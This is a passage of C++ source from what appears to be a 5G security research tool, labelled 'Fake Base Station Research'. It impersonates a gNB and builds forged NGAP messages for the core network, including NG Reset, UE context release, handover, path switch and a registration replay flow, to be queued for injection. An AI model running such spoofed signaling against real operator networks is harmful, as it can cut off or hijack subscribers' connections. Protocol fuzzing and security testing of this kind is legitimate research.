// UHM WINGS Fake Base Station Research

#include "CLI/CLI11.hpp"
#include "lib/gateways/sctp_network_gateway_common_impl.h"
#include "lib/ngap/ngap_asn1_converters.h"
#include "lib/ngap/ngap_asn1_helpers.h"
#include "ocudu/asn1/asn1_utils.h"
#include "ocudu/asn1/ngap/common.h"
#include "ocudu/asn1/rrc_nr/rrc_nr.h"
#include "ocudu/cu_cp/cu_cp_types.h"
#include "ocudu/gateways/sctp_network_gateway.h"
#include "ocudu/gateways/sctp_socket.h"
#include "ocudu/ngap/ngap_context.h"
#include "ocudu/ngap/ngap_message.h"
#include "ocudu/ocudulog/ocudulog.h"
#include "ocudu/ran/cause/ngap_cause.h"
#include "ocudu/ran/plmn_identity.h"
#include "ocudu/support/io/sockets.h"
#include <algorithm>
#include <arpa/inet.h>
#include <array>
#include <cerrno>
#include <chrono>
#include <cctype>
#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <netdb.h>
#include <netinet/sctp.h>
#include <optional>
#include <iomanip>
#include <sstream>
#include <stdexcept>
#include <string>
#include <sys/socket.h>
#include <sys/select.h>
#include <thread>
#include <vector>

using namespace ocudu;
using namespace ocudu::ocucp;
using namespace asn1::ngap;

namespace {

static constexpr unsigned stream_no                 = 0;
static constexpr size_t   network_gateway_sctp_mtu = 9100;
static constexpr uint64_t  max_amf_ue_ngap_id       = 1099511627775ULL;
static constexpr uint64_t  max_ran_ue_ngap_id       = 4294967295ULL;
static constexpr uint64_t  max_pdu_session_id       = pdu_session_id_to_uint(pdu_session_id_t::max);
static constexpr uint32_t  default_gnb_id           = 411;
static constexpr uint8_t   default_gnb_id_bit_len   = 22;
static constexpr uint16_t  default_sector_id        = 0;
static constexpr uint64_t  max_default_gnb_id       = (1ULL << default_gnb_id_bit_len) - 1;
static constexpr const char* default_ran_node_name   = "cu_cp_01";

static uint32_t    current_gnb_id = default_gnb_id;
static std::string current_ran_node_name{default_ran_node_name};

struct probe_config {
  std::vector<std::string> amf_addresses;
  int                      amf_port              = NGAP_PORT;
  std::vector<std::string> bind_addresses;
  int                      bind_port             = 0;
  std::string              bind_interface        = "auto";
  int                      init_max_attempts     = 2;
  int                      max_init_timeo_ms     = 1000;
  bool                     dump_pdu_hex          = true;
};

struct ue_ngap_ids {
  uint64_t amf_ue_ngap_id;
  uint64_t ran_ue_ngap_id;
};

enum class ue_message_type {
  ng_setup_request,
  ng_reset,
  ng_reset_acknowledge,
  ran_configuration_update,
  amf_configuration_update_acknowledge,
  amf_configuration_update_failure,
  non_ue_error_indication,
  ue_context_release_request,
  uplink_nas_transport,
  pdu_session_resource_release_response,
  nas_non_delivery_indication,
  pdu_session_resource_notify,
  handover_required,
  handover_request_acknowledge,
  handover_failure,
  handover_cancel,
  path_switch_request,
  initial_ue_message,
  initial_context_setup_response,
  initial_context_setup_failure,
  ue_context_release_complete,
  ue_context_modification_response,
  ue_context_modification_failure,
  rrc_inactive_transition_report,
  ue_context_suspend_request,
  ue_context_resume_request,
  ran_cp_relocation_indication,
  ue_error_indication,
  ue_radio_capability_info_indication,
  duplicate_registration_replay_flow,
  pdu_session_resource_setup_response,
  pdu_session_resource_modify_response,
  pdu_session_resource_modify_indication,
  ue_radio_capability_check_response,
  location_report,
  location_reporting_failure_indication,
  handover_notify,
  uplink_ran_status_transfer,
  uplink_ran_early_status_transfer,
  ue_radio_capability_id_mapping_response,
  trace_failure_indication,
  cell_traffic_trace,
  secondary_rat_data_usage_report
};

struct injectable_ngap_pdu {
  byte_buffer pdu;
  const char* name;
  int         wait_before_send_ms = 0;
  std::string wait_for_amf_before_send;
  int         amf_wait_timeout_ms = 10000;
};

static byte_buffer pack_ngap_message(ngap_message& ngap_msg, const char* message_name)
{
  byte_buffer   packed_pdu{byte_buffer::fallback_allocation_tag{}};
  asn1::bit_ref bref(packed_pdu);
  if (ngap_msg.pdu.pack(bref) != asn1::OCUDUASN_SUCCESS) {
    throw std::runtime_error(std::string("Failed to pack ") + message_name);
  }

  return packed_pdu;
}

static cu_cp_user_location_info_nr default_user_location_info()
{
  cu_cp_user_location_info_nr user_location_info = {};
  user_location_info.nr_cgi.plmn_id             = plmn_identity::test_value();
  user_location_info.nr_cgi.nci                 = nr_cell_identity::create(gnb_id_t{current_gnb_id, default_gnb_id_bit_len}, default_sector_id).value();
  user_location_info.tai.plmn_id                = plmn_identity::test_value();
  user_location_info.tai.tac                    = 7;
  return user_location_info;
}

static byte_buffer make_hex_byte_buffer_or_throw(const std::string& hex);
static cause_c build_radio_network_cause(const std::string& cause_name);
static asn1::ngap::global_gnb_id_s build_global_gnb_id(const std::string& plmn, uint32_t gnb_id);
static user_location_info_c build_user_location_info(const std::string& plmn, const std::string& tac);
static up_transport_layer_info_c build_gtp_tunnel(const std::string& address, uint32_t teid);
static std::string describe_ngap_pdu(const byte_buffer& pdu);
static std::string ipv4_to_bit_string(const std::string& address);

static constexpr const char* default_ho_prep_rrc_container_hex =
    "0021930680ce811d1968097e340e1480005824c5c00060fc2c00637fe002e00131401a0000000880058d006007a071e"
    "439f0000240400e03"
    "00000000100186c0000700809df0000000000000103a0002000012cb2800281c50f0007000f00000004008010240a0";

static constexpr const char* default_rrc_handover_command_container_hex =
    "081a115568220201204550001e1004bcc012121600020509a0000193f7c7000000243434840be2e0260030258380f80408d078100009"
    "39dc601349798002692f120200046402051320c6b6c6bb003704020000080800041a235246c013497890000023271adb19127c058332"
    "55ff8092748837146e30dc71b9637dfab6387580221603400c162300e0102908024985950001ff000000000306e10840003c02ca0041"
    "8000001034c080a28500071c48000133557c841c001040c2050c1c9c48a163068e1e408800004280004005a8000864428000c645a800"
    "10024280014025a8001862428001c625a800200842800240c8200a0320902c0c8280c0320b0340c8300e0320d03c0c83810162080440"
    "e829024b92a4a1814388e8acf1379340e9041e2efc0c10e0000001c7feb311aa6ab940b000010cbb00000000000000000008422b5514"
    "011c00401020800388402710038082042000710804e10070204104000e21009c200e0608108001c420138601c10104100038840270c0"
    "020000002086020406080706800071c40000002004000806000809002200a60000231002271c00600040";

static bool decode_ue_capability_rat_container_list(const byte_buffer& input,
                                                    asn1::rrc_nr::ue_cap_rat_container_list_l& capability_list)
{
  asn1::cbit_ref bref({input.begin(), input.end()});
  asn1::rrc_nr::ue_cap_rat_container_list_l decoded;
  if (asn1::unpack_dyn_seq_of(decoded, bref, 0, 8) == asn1::OCUDUASN_SUCCESS) {
    capability_list = std::move(decoded);
    return true;
  }
  return false;
}

static bool decode_ue_radio_access_capability_info(const byte_buffer& input,
                                                   asn1::rrc_nr::ue_cap_rat_container_list_l& capability_list)
{
  asn1::rrc_nr::ue_radio_access_cap_info_s cap_info = {};
  asn1::cbit_ref                           bref({input.begin(), input.end()});
  if (cap_info.unpack(bref) != asn1::OCUDUASN_SUCCESS ||
      cap_info.crit_exts.type() != asn1::rrc_nr::ue_radio_access_cap_info_s::crit_exts_c_::types_opts::c1 ||
      cap_info.crit_exts.c1().type() !=
          asn1::rrc_nr::ue_radio_access_cap_info_s::crit_exts_c_::c1_c_::types_opts::ue_radio_access_cap_info) {
    return false;
  }

  const auto& wrapped_capability = cap_info.crit_exts.c1().ue_radio_access_cap_info().ue_radio_access_cap_info;
  byte_buffer capability_pdu{byte_buffer::fallback_allocation_tag{}};
  if (!capability_pdu.append(wrapped_capability.begin(), wrapped_capability.end())) {
    return false;
  }
  return decode_ue_capability_rat_container_list(capability_pdu, capability_list);
}

static byte_buffer build_handover_preparation_rrc_container_from_capability(const byte_buffer& capability_input)
{
  asn1::rrc_nr::ue_cap_rat_container_list_l capability_list;
  if (!decode_ue_capability_rat_container_list(capability_input, capability_list) &&
      !decode_ue_radio_access_capability_info(capability_input, capability_list)) {
    throw std::runtime_error("Failed to decode UE capability hex as UE-CapabilityRAT-ContainerList or "
                             "UERadioAccessCapabilityInformation");
  }

  asn1::rrc_nr::ho_prep_info_s      ho_prep = {};
  asn1::rrc_nr::ho_prep_info_ies_s& ies     = ho_prep.crit_exts.set_c1().set_ho_prep_info();
  ies.ue_cap_rat_list                       = std::move(capability_list);

  byte_buffer   packed{byte_buffer::fallback_allocation_tag{}};
  asn1::bit_ref bref{packed};
  if (ho_prep.pack(bref) != asn1::OCUDUASN_SUCCESS) {
    throw std::runtime_error("Failed to pack RRC HandoverPreparationInformation");
  }
  return packed;
}

static byte_buffer build_ng_setup_request()
{
  ngap_context_t ngap_ctxt = {{current_gnb_id, default_gnb_id_bit_len},
                              current_ran_node_name,
                              "AMF",
                              amf_index_t::min,
                              {{7, {{plmn_identity::test_value(), {{slice_service_type{1}}}}}}},
                              {},
                              256};

  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg();
  ngap_msg.pdu.init_msg().load_info_obj(ASN1_NGAP_ID_NG_SETUP);
  fill_asn1_ng_setup_request(ngap_msg.pdu.init_msg().value.ng_setup_request(), ngap_ctxt);

  return pack_ngap_message(ngap_msg, "NGSetupRequest");
}

static byte_buffer build_ue_context_release_request(uint64_t                  amf_ue_ngap_id,
                                                    uint64_t                  ran_ue_ngap_id,
                                                    ngap_cause_radio_network_t cause)
{
  cu_cp_ue_context_release_request release_request = {};
  release_request.cause = cause;

  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg();
  ngap_msg.pdu.init_msg().load_info_obj(ASN1_NGAP_ID_UE_CONTEXT_RELEASE_REQUEST);

  auto& asn1_request            = ngap_msg.pdu.init_msg().value.ue_context_release_request();
  asn1_request->amf_ue_ngap_id = amf_ue_ngap_id;
  asn1_request->ran_ue_ngap_id = ran_ue_ngap_id;
  fill_asn1_ue_context_release_request(asn1_request, release_request);

  return pack_ngap_message(ngap_msg, "UEContextReleaseRequest");
}

static byte_buffer build_uplink_nas_transport(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id, byte_buffer nas_pdu)
{
  cu_cp_ul_nas_transport ul_nas_transport = {};
  ul_nas_transport.nas_pdu                = std::move(nas_pdu);
  ul_nas_transport.user_location_info     = default_user_location_info();

  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg();
  ngap_msg.pdu.init_msg().load_info_obj(ASN1_NGAP_ID_UL_NAS_TRANSPORT);

  auto& asn1_msg            = ngap_msg.pdu.init_msg().value.ul_nas_transport();
  asn1_msg->amf_ue_ngap_id = amf_ue_ngap_id;
  asn1_msg->ran_ue_ngap_id = ran_ue_ngap_id;
  fill_asn1_ul_nas_transport(asn1_msg, ul_nas_transport);

  return pack_ngap_message(ngap_msg, "UplinkNASTransport");
}

static byte_buffer
build_pdu_session_resource_release_response(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id, uint16_t pdu_session_id)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_PDU_SESSION_RES_RELEASE);

  auto& asn1_resp            = ngap_msg.pdu.successful_outcome().value.pdu_session_res_release_resp();
  asn1_resp->amf_ue_ngap_id = amf_ue_ngap_id;
  asn1_resp->ran_ue_ngap_id = ran_ue_ngap_id;

  asn1::ngap::pdu_session_res_release_resp_transfer_s transfer = {};
  transfer.ext                                                = false;
  byte_buffer transfer_pdu = pack_into_pdu(transfer, "PDUSessionResourceReleaseResponseTransfer");
  if (transfer_pdu.empty()) {
    throw std::runtime_error("Failed to pack PDUSessionResourceReleaseResponseTransfer");
  }

  asn1::ngap::pdu_session_res_released_item_rel_res_s released_item = {};
  released_item.pdu_session_id                                     = pdu_session_id;
  released_item.pdu_session_res_release_resp_transfer              = std::move(transfer_pdu);
  asn1_resp->pdu_session_res_released_list_rel_res.push_back(std::move(released_item));

  return pack_ngap_message(ngap_msg, "PDUSessionResourceReleaseResponse");
}

static byte_buffer build_pdu_session_resource_setup_response(uint64_t    amf_ue_ngap_id,
                                                            uint64_t    ran_ue_ngap_id,
                                                            uint16_t    pdu_session_id,
                                                            uint32_t    teid,
                                                            std::string transport_layer_address,
                                                            uint8_t     qfi)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_PDU_SESSION_RES_SETUP);

  auto& msg            = ngap_msg.pdu.successful_outcome().value.pdu_session_res_setup_resp();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->pdu_session_res_setup_list_su_res_present = true;

  pdu_session_res_setup_resp_transfer_s transfer = {};
  transfer.dl_qos_flow_per_tnl_info.up_transport_layer_info = build_gtp_tunnel(transport_layer_address, teid);
  associated_qos_flow_item_s qos = {};
  qos.qos_flow_id = qfi;
  transfer.dl_qos_flow_per_tnl_info.associated_qos_flow_list.push_back(qos);

  pdu_session_res_setup_item_su_res_s item = {};
  item.pdu_session_id = pdu_session_id;
  item.pdu_session_res_setup_resp_transfer = pack_into_pdu(transfer, "PDUSessionResourceSetupResponseTransfer");
  if (item.pdu_session_res_setup_resp_transfer.empty()) {
    throw std::runtime_error("Failed to pack PDUSessionResourceSetupResponseTransfer");
  }
  msg->pdu_session_res_setup_list_su_res.push_back(std::move(item));

  return pack_ngap_message(ngap_msg, "PDUSessionResourceSetupResponse");
}

static ue_associated_lc_ng_conn_item_s build_ue_associated_lc_ng_conn_item(const ue_ngap_ids& ids)
{
  ue_associated_lc_ng_conn_item_s item = {};
  item.amf_ue_ngap_id_present         = true;
  item.ran_ue_ngap_id_present         = true;
  item.amf_ue_ngap_id                 = ids.amf_ue_ngap_id;
  item.ran_ue_ngap_id                 = ids.ran_ue_ngap_id;
  return item;
}

static byte_buffer build_ng_reset(bool reset_ng_interface, const std::vector<ue_ngap_ids>& ue_ids)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_NG_RESET);

  auto& msg = ngap_msg.pdu.init_msg().value.ng_reset();
  msg->cause = build_radio_network_cause("radio-connection-with-ue-lost");
  if (reset_ng_interface) {
    msg->reset_type.set_ng_interface() = reset_all_opts::reset_all;
  } else {
    auto& list = msg->reset_type.set_part_of_ng_interface();
    for (const auto& ids : ue_ids) {
      list.push_back(build_ue_associated_lc_ng_conn_item(ids));
    }
  }

  return pack_ngap_message(ngap_msg, "NGReset");
}

static byte_buffer build_ng_reset_acknowledge(const std::vector<ue_ngap_ids>& ue_ids)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_NG_RESET);

  auto& msg = ngap_msg.pdu.successful_outcome().value.ng_reset_ack();
  if (!ue_ids.empty()) {
    msg->ue_associated_lc_ng_conn_list_present = true;
    for (const auto& ids : ue_ids) {
      msg->ue_associated_lc_ng_conn_list.push_back(build_ue_associated_lc_ng_conn_item(ids));
    }
  }

  return pack_ngap_message(ngap_msg, "NGResetAcknowledge");
}

static byte_buffer build_ran_configuration_update(uint32_t    gnb_id,
                                                  std::string plmn,
                                                  std::string tac,
                                                  uint8_t     sst,
                                                  std::string sd)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_RAN_CFG_UPD);

  auto& msg = ngap_msg.pdu.init_msg().value.ran_cfg_upd();
  msg->global_ran_node_id_present = true;
  msg->global_ran_node_id.set_global_gnb_id() = build_global_gnb_id(plmn, gnb_id);

  msg->supported_ta_list_present = true;
  supported_ta_item_s ta_item    = {};
  ta_item.tac.from_string(tac);
  broadcast_plmn_item_s plmn_item = {};
  plmn_item.plmn_id.from_string(plmn);
  slice_support_item_s slice = {};
  slice.s_nssai.sst.from_number(sst);
  if (!sd.empty() && sd != "none") {
    slice.s_nssai.sd_present = true;
    slice.s_nssai.sd.from_string(sd);
  }
  plmn_item.tai_slice_support_list.push_back(slice);
  ta_item.broadcast_plmn_list.push_back(plmn_item);
  msg->supported_ta_list.push_back(ta_item);

  return pack_ngap_message(ngap_msg, "RANConfigurationUpdate");
}


static byte_buffer build_amf_configuration_update_acknowledge()
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_AMF_CFG_UPD);
  (void)ngap_msg.pdu.successful_outcome().value.amf_cfg_upd_ack();
  return pack_ngap_message(ngap_msg, "AMFConfigurationUpdateAcknowledge");
}

static byte_buffer build_amf_configuration_update_failure(const std::string& cause_name)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_unsuccessful_outcome().load_info_obj(ASN1_NGAP_ID_AMF_CFG_UPD);

  auto& msg = ngap_msg.pdu.unsuccessful_outcome().value.amf_cfg_upd_fail();
  msg->cause = build_radio_network_cause(cause_name);

  return pack_ngap_message(ngap_msg, "AMFConfigurationUpdateFailure");
}

static byte_buffer build_error_indication(bool        include_amf_ue_ngap_id,
                                          uint64_t    amf_ue_ngap_id,
                                          bool        include_ran_ue_ngap_id,
                                          uint64_t    ran_ue_ngap_id,
                                          bool        include_cause,
                                          std::string cause_name,
                                          bool        criticality_diagnostics_present)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_ERROR_IND);

  auto& msg = ngap_msg.pdu.init_msg().value.error_ind();
  msg->amf_ue_ngap_id_present = include_amf_ue_ngap_id;
  msg->ran_ue_ngap_id_present = include_ran_ue_ngap_id;
  msg->cause_present          = include_cause;
  if (include_amf_ue_ngap_id) {
    msg->amf_ue_ngap_id = amf_ue_ngap_id;
  }
  if (include_ran_ue_ngap_id) {
    msg->ran_ue_ngap_id = ran_ue_ngap_id;
  }
  if (include_cause) {
    msg->cause = build_radio_network_cause(cause_name);
  }
  msg->crit_diagnostics_present = criticality_diagnostics_present;

  return pack_ngap_message(ngap_msg, "ErrorIndication");
}

static byte_buffer build_nas_non_delivery_indication(uint64_t    amf_ue_ngap_id,
                                                     uint64_t    ran_ue_ngap_id,
                                                     std::string cause_name,
                                                     byte_buffer nas_pdu)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_NAS_NON_DELIVERY_IND);

  auto& msg            = ngap_msg.pdu.init_msg().value.nas_non_delivery_ind();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->nas_pdu        = std::move(nas_pdu);
  msg->cause          = build_radio_network_cause(cause_name);

  return pack_ngap_message(ngap_msg, "NASNonDeliveryIndication");
}

static byte_buffer build_pdu_session_resource_notify(uint64_t amf_ue_ngap_id,
                                                     uint64_t ran_ue_ngap_id,
                                                     uint16_t pdu_session_id,
                                                     uint8_t  qfi,
                                                     std::string cause_name)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_PDU_SESSION_RES_NOTIFY);

  auto& msg                         = ngap_msg.pdu.init_msg().value.pdu_session_res_notify();
  msg->amf_ue_ngap_id              = amf_ue_ngap_id;
  msg->ran_ue_ngap_id              = ran_ue_ngap_id;
  msg->pdu_session_res_notify_list_present = true;

  pdu_session_res_notify_item_s item = {};
  item.pdu_session_id = pdu_session_id;
  pdu_session_res_notify_transfer_s transfer = {};
  qos_flow_notify_item_s qos = {};
  qos.qos_flow_id    = qfi;
  qos.notif_cause    = notif_cause_opts::not_fulfilled;
  transfer.qos_flow_notify_list.push_back(qos);
  qos_flow_with_cause_item_s released_qos = {};
  released_qos.qos_flow_id = qfi;
  released_qos.cause       = build_radio_network_cause(cause_name);
  transfer.qos_flow_released_list.push_back(released_qos);
  item.pdu_session_res_notify_transfer = pack_into_pdu(transfer, "PDUSessionResourceNotifyTransfer");
  if (item.pdu_session_res_notify_transfer.empty()) {
    throw std::runtime_error("Failed to pack PDUSessionResourceNotifyTransfer");
  }
  msg->pdu_session_res_notify_list.push_back(std::move(item));

  return pack_ngap_message(ngap_msg, "PDUSessionResourceNotify");
}

static target_id_c build_target_id(uint32_t target_gnb_id, const std::string& plmn, const std::string& tac)
{
  target_id_c target;
  auto&       ran_node = target.set_target_ran_node_id();
  ran_node.global_ran_node_id.set_global_gnb_id() = build_global_gnb_id(plmn, target_gnb_id);
  ran_node.sel_tai.plmn_id.from_string(plmn);
  ran_node.sel_tai.tac.from_string(tac);
  return target;
}

static handov_type_e parse_handover_type(const std::string& value)
{
  if (value == "5gs-to-eps") {
    return handov_type_opts::fivegs_to_eps;
  }
  if (value == "eps-to-5gs") {
    return handov_type_opts::eps_to_5gs;
  }
  return handov_type_opts::intra5gs;
}

static byte_buffer build_source_to_target_transparent_container(uint32_t           target_gnb_id,
                                                                const std::string& plmn,
                                                                uint16_t           pdu_session_id,
                                                                uint8_t            qfi,
                                                                byte_buffer        rrc_container)
{
  source_ngran_node_to_target_ngran_node_transparent_container_s container = {};
  container.rrc_container                                                 = std::move(rrc_container);

  pdu_session_res_info_item_s pdu_info = {};
  pdu_info.pdu_session_id              = pdu_session_id;
  qos_flow_info_item_s qos_info        = {};
  qos_info.qos_flow_id                 = qfi;
  pdu_info.qos_flow_info_list.push_back(qos_info);
  container.pdu_session_res_info_list.push_back(pdu_info);

  auto& target_nr_cgi = container.target_cell_id.set_nr_cgi();
  target_nr_cgi.plmn_id.from_string(plmn);
  target_nr_cgi.nr_cell_id.from_number(
      nr_cell_identity::create(gnb_id_t{target_gnb_id, default_gnb_id_bit_len}, default_sector_id).value().value());

  last_visited_cell_item_s        last_visited_cell = {};
  last_visited_ngran_cell_info_s& ngran_cell        = last_visited_cell.last_visited_cell_info.set_ngran_cell();
  auto&                           source_nr_cgi     = ngran_cell.global_cell_id.set_nr_cgi();
  source_nr_cgi.plmn_id.from_string(plmn);
  source_nr_cgi.nr_cell_id.from_number(
      nr_cell_identity::create(gnb_id_t{current_gnb_id, default_gnb_id_bit_len}, default_sector_id).value().value());
  ngran_cell.cell_type.cell_size = cell_size_opts::small;
  container.ue_history_info.push_back(last_visited_cell);

  byte_buffer   packed{byte_buffer::fallback_allocation_tag{}};
  asn1::bit_ref bref{packed};
  if (container.pack(bref) != asn1::OCUDUASN_SUCCESS) {
    throw std::runtime_error("Failed to pack SourceToTarget-TransparentContainer");
  }
  return packed;
}

static byte_buffer build_handover_required(uint64_t    amf_ue_ngap_id,
                                           uint64_t    ran_ue_ngap_id,
                                           std::string cause_name,
                                           uint32_t    target_gnb_id,
                                           std::string handover_type,
                                           std::string plmn,
                                           std::string tac,
                                           uint16_t    pdu_session_id,
                                           uint8_t     qfi,
                                           byte_buffer rrc_container)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_HO_PREP);

  auto& msg            = ngap_msg.pdu.init_msg().value.ho_required();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->cause          = build_radio_network_cause(cause_name);
  msg->handov_type    = parse_handover_type(handover_type);
  msg->target_id      = build_target_id(target_gnb_id, plmn, tac);
  msg->source_to_target_transparent_container =
      build_source_to_target_transparent_container(target_gnb_id, plmn, pdu_session_id, qfi, std::move(rrc_container));

  pdu_session_res_item_ho_rqd_s item = {};
  item.pdu_session_id = pdu_session_id;
  ho_required_transfer_s transfer = {};
  item.ho_required_transfer       = pack_into_pdu(transfer, "HandoverRequiredTransfer");
  if (item.ho_required_transfer.empty()) {
    throw std::runtime_error("Failed to pack HandoverRequiredTransfer");
  }
  msg->pdu_session_res_list_ho_rqd.push_back(item);

  return pack_ngap_message(ngap_msg, "HandoverRequired");
}

static byte_buffer build_target_to_source_transparent_container(const std::string& rrc_container_hex)
{
  target_ngran_node_to_source_ngran_node_transparent_container_s container = {};
  container.rrc_container = make_hex_byte_buffer_or_throw(rrc_container_hex);

  byte_buffer   packed{byte_buffer::fallback_allocation_tag{}};
  asn1::bit_ref bref{packed};
  if (container.pack(bref) != asn1::OCUDUASN_SUCCESS) {
    throw std::runtime_error("Failed to pack TargetToSource-TransparentContainer");
  }
  return packed;
}

static byte_buffer build_handover_request_acknowledge(uint64_t    amf_ue_ngap_id,
                                                      uint64_t    ran_ue_ngap_id,
                                                      uint16_t    pdu_session_id,
                                                      uint32_t    teid,
                                                      std::string transport_layer_address,
                                                      uint8_t     qfi,
                                                      byte_buffer target_to_source_container)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_successful_outcome().load_info_obj(ASN1_NGAP_ID_HO_RES_ALLOC);

  auto& msg            = ngap_msg.pdu.successful_outcome().value.ho_request_ack();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->target_to_source_transparent_container = std::move(target_to_source_container);

  ho_request_ack_transfer_s transfer = {};
  transfer.dl_ngu_up_tnl_info = build_gtp_tunnel(transport_layer_address, teid);
  qos_flow_item_with_data_forwarding_s qos = {};
  qos.qos_flow_id = qfi;
  transfer.qos_flow_setup_resp_list.push_back(qos);

  pdu_session_res_admitted_item_s item = {};
  item.pdu_session_id = pdu_session_id;
  item.ho_request_ack_transfer = pack_into_pdu(transfer, "HandoverRequestAcknowledgeTransfer");
  if (item.ho_request_ack_transfer.empty()) {
    throw std::runtime_error("Failed to pack HandoverRequestAcknowledgeTransfer");
  }
  msg->pdu_session_res_admitted_list.push_back(std::move(item));

  return pack_ngap_message(ngap_msg, "HandoverRequestAcknowledge");
}

static byte_buffer build_handover_failure(uint64_t amf_ue_ngap_id, const std::string& cause_name, byte_buffer fail_container)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_unsuccessful_outcome().load_info_obj(ASN1_NGAP_ID_HO_RES_ALLOC);

  auto& msg            = ngap_msg.pdu.unsuccessful_outcome().value.ho_fail();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->cause          = build_radio_network_cause(cause_name);
  if (!fail_container.empty()) {
    msg->targetto_source_fail_transparent_container_present = true;
    msg->targetto_source_fail_transparent_container = std::move(fail_container);
  }

  return pack_ngap_message(ngap_msg, "HandoverFailure");
}

static byte_buffer build_handover_cancel(uint64_t amf_ue_ngap_id, uint64_t ran_ue_ngap_id, std::string cause_name)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_HO_CANCEL);

  auto& msg            = ngap_msg.pdu.init_msg().value.ho_cancel();
  msg->amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id = ran_ue_ngap_id;
  msg->cause          = build_radio_network_cause(cause_name);

  return pack_ngap_message(ngap_msg, "HandoverCancel");
}

static byte_buffer build_path_switch_request(uint64_t    amf_ue_ngap_id,
                                             uint64_t    ran_ue_ngap_id,
                                             uint16_t    pdu_session_id,
                                             uint32_t    teid,
                                             std::string transport_layer_address,
                                             uint8_t     qfi,
                                             std::string plmn,
                                             std::string tac)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_PATH_SWITCH_REQUEST);

  auto& msg                   = ngap_msg.pdu.init_msg().value.path_switch_request();
  msg->source_amf_ue_ngap_id = amf_ue_ngap_id;
  msg->ran_ue_ngap_id        = ran_ue_ngap_id;
  msg->user_location_info    = build_user_location_info(plmn, tac);
  msg->ue_security_cap.nr_encryption_algorithms.from_number(49152);
  msg->ue_security_cap.nr_integrity_protection_algorithms.from_number(49152);
  msg->ue_security_cap.eutr_aencryption_algorithms.from_number(0);
  msg->ue_security_cap.eutr_aintegrity_protection_algorithms.from_number(0);

  path_switch_request_transfer_s transfer = {};
  transfer.dl_ngu_up_tnl_info = build_gtp_tunnel(transport_layer_address, teid);
  qos_flow_accepted_item_s qos = {};
  qos.qos_flow_id = qfi;
  transfer.qos_flow_accepted_list.push_back(qos);

  pdu_session_res_to_be_switched_dl_item_s item = {};
  item.pdu_session_id = pdu_session_id;
  item.path_switch_request_transfer = pack_into_pdu(transfer, "PathSwitchRequestTransfer");
  if (item.path_switch_request_transfer.empty()) {
    throw std::runtime_error("Failed to pack PathSwitchRequestTransfer");
  }
  msg->pdu_session_res_to_be_switched_dl_list.push_back(std::move(item));

  return pack_ngap_message(ngap_msg, "PathSwitchRequest");
}

static rrc_establishment_cause_e parse_rrc_establishment_cause(const std::string& value)
{
  if (value == "mo-data") {
    return rrc_establishment_cause_opts::mo_data;
  }
  if (value == "mo-signalling" || value == "mo-sig") {
    return rrc_establishment_cause_opts::mo_sig;
  }
  if (value == "emergency") {
    return rrc_establishment_cause_opts::emergency;
  }
  if (value == "mt-access") {
    return rrc_establishment_cause_opts::mt_access;
  }
  return rrc_establishment_cause_opts::mo_sig;
}

static rrc_state_e parse_rrc_state(const std::string& value)
{
  if (value == "inactive") {
    return rrc_state_opts::inactive;
  }
  return rrc_state_opts::connected;
}

static byte_buffer build_initial_ue_message(uint64_t    ran_ue_ngap_id,
                                            byte_buffer nas_pdu,
                                            std::string tac,
                                            std::string plmn,
                                            std::string rrc_establishment_cause)
{
  ngap_message ngap_msg = {};
  ngap_msg.pdu.set_init_msg().load_info_obj(ASN1_NGAP_ID_INIT_UE_MSG);

  auto& msg                    = ngap_msg.pdu.init_msg().value.init_ue_msg();
  msg->ran_ue_ngap_id         = ran_ue_ngap_id;
  msg->nas_pdu                = std::move(nas_pdu);
  msg->user_location_info     = build_user_location_info(plmn, tac);
  msg->rrc_establishment_cause = parse_rrc_establishment_cause(rrc_establishment_cause);

  return pack_ngap_message(ngap_msg, "InitialUEMessage");
}

static pdu_session_res_setup_resp_transfer_s build_pdu_session_resource_setup_response_transfer(
    const std::string& transport_layer_address, uint32_t teid, uint8_t qfi)
{
  pdu_session_res_setup_resp_transfer_s transfer = {};
  transfer.dl_qos_flow_per_tnl_info.up_transport_layer_info = build_gtp_tunnel(transport_layer_address, teid);
  associated_qos_flow_item_s qos = {};
  qos.qos_flow_id = qfi;
